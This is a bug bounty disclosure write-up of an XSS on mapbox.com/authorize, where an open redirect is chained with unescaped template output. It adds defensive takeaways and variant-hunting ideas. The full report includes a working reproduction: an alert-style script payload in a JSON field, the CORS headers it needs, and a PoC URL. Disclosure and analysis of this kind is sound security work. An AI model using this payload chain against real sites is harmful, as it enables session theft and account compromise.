# XSS on mapbox.com/authorize/ via Open Redirect and Unescaped Template Injection

## Metadata
- **Source:** HackerOne
- **Report:** 143240 | https://hackerone.com/reports/143240
- **Submitted:** 2016-06-05
- **Reporter:** stefanovettorazzi
- **Program:** Mapbox
- **Bounty:** Not specified in report
- **Severity:** high
- **Vuln:** Open Redirect, Cross-Site Scripting (XSS), Template Injection, Improper Output Encoding
- **CVEs:** None
- **Category:** web-api

## Summary
The /core/oauth/auth endpoint accepts an attacker-controlled redirect_uri parameter and performs an unvalidated 302 redirect to it. The response from the attacker's server is then used to populate a template on /authorize/ without proper HTML escaping, allowing JavaScript injection through the authorize_url property. This chain of vulnerabilities enables stored XSS execution in the context of mapbox.com.

## Attack scenario
1. Attacker crafts a malicious HTTPS endpoint that returns JSON with XSS payload in the authorize_url field
2. Attacker sends target user a link to mapbox.com/authorize/?redirect_uri=[attacker_endpoint]
3. User clicks link; mapbox.com makes request to /core/oauth/auth with the redirect_uri parameter
4. Server performs unvalidated 302 redirect to attacker's HTTPS endpoint
5. Attacker's server responds with JSON containing '<script>alert(document.domain);</script> in authorize_url
6. mapbox.com template engine renders the authorize_url value without HTML escaping, executing the malicious JavaScript in victim's browser

## Root cause
Two chained vulnerabilities: (1) Open redirect in /core/oauth/auth that blindly redirects to user-supplied redirect_uri without validation, and (2) Failure to HTML-escape the authorize_url property from JSON response before inserting into HTML template via <%= %> template syntax without sanitization

## Attacker mindset
An attacker recognizes that OAuth flows are commonly used for authentication and that developers often trust responses from endpoints they control. By exploiting the open redirect combined with unescaped template injection, they can execute arbitrary JavaScript in the victim's browser while authenticated to mapbox.com, potentially stealing session tokens or performing actions on behalf of the victim.

## Defensive takeaways
- Implement strict whitelist validation for redirect_uri parameters; only allow redirects to trusted, pre-registered domains
- Always HTML-escape user-controlled data before rendering in templates, especially in OAuth/authentication flows
- Use template engines with auto-escaping enabled by default; avoid raw template syntax like <%= %> for untrusted data
- Implement Content Security Policy (CSP) headers to mitigate XSS impact even if injection occurs
- Validate and sanitize JSON responses from external sources, particularly in authentication/authorization contexts
- Consider using Content-Type: application/json with X-Content-Type-Options: nosniff to prevent MIME-type confusion
- Add integrity checks or signatures to OAuth response data to ensure it hasn't been tampered with

## Variant hunting
Test other OAuth endpoints for open redirect vulnerabilities (e.g., /callback, /return, /finish)
Check if other template variables in oauth responses are similarly unescaped (stage, user.name, origin)
Look for similar authorization pages on other Mapbox subdomains or related services
Test CORS bypass techniques with different header combinations to exfiltrate sensitive data
Check if the vulnerability affects other redirect_uri parameters across the application
Investigate if other OAuth providers integrated with Mapbox have similar issues

## MITRE ATT&CK
- T1190
- T1598
- T1566
- T1204

## Notes
This vulnerability was particularly critical because it combined multiple weaknesses in a single attack chain. The open redirect alone might have been considered low-risk, but combined with template injection it became a full account compromise vector. The use of CORS headers with credentials=true is a significant detail that enabled the cross-origin fetch and exploitation. The report demonstrates good research methodology by providing working PoC URLs and showing the vulnerability works across multiple browsers.

## Full report
<details><summary>Expand</summary>

Description
---
When you load the endpoint https://www.mapbox.com/authorize/ a GET request is made to the endpoint https://www.mapbox.com/core/oauth/auth with the parameters passed in the request to https://www.mapbox.com/authorize/. 
If you only send the parameter __redirect_uri__ in the request to https://www.mapbox.com/core/oauth/auth, the response from the server is a 302 redirect to the value passed in the parameter __redirect_uri__.
If the response from the latest request (after the redirect) is valid like:
```json
{
  "authorize_url": "/authrozie/...",
  "stage": "authorize",
  "user": {
    "name": "some-name",
    "extraTm2z": 1
  },
  "origin": ""
}
```
the content is used to render the template __template-modal-oauth__ in https://www.mapbox.com/authorize/.

The problem is that the value of the property `"authorize_url"` is not escaped when passed to the template
```html
<form id='oauth' method='post' action='<%=App.api + obj.authorize_url%>' class='col6 modal-body fill-white'>
...
```
which allows to break the `<form>` using `'>` and insert HTML and Javascript code.

Reproduction steps
---
1. Create a file with this content in a server that supports __https://__

      ```json
      {
        "authorize_url": "'><script>alert(document.domain);</script>",
        "stage": "authorize",
        "user": {
          "name": "nombre",
          "extraTm2z": 1
       },
       "origin": ""
     }
     ```

2. Set these headers to be returned in the response when serving the file (I don't specify how because it varies from server to server and language)

      ```
      Access-Control-Allow-Origin: https://www.mapbox.com
      Access-Control-Allow-Credentials: true
      Access-Control-Allow-Headers: x-requested-with
      ```

3. Load the following URL on Chrome, Safari, Firefox, Internet Explorer 11, or Edge

      ```
      https://www.mapbox.com/authorize/?redirect_uri=[url_to_file_created_in_step_1]
      ```

4. `alert(document.domain)` is executed

Proof of concept
---
Load the following URL on Chrome, Safari, Firefox, Internet Explorer 11, or Edge
```
https://www.mapbox.com/authorize/?redirect_uri=https://u00f1.xyz/mapbox/oauth.json
```

I'm going to do a screen recording and upload it.

</details>

---
*Analysed by Claude on 2026-05-24*
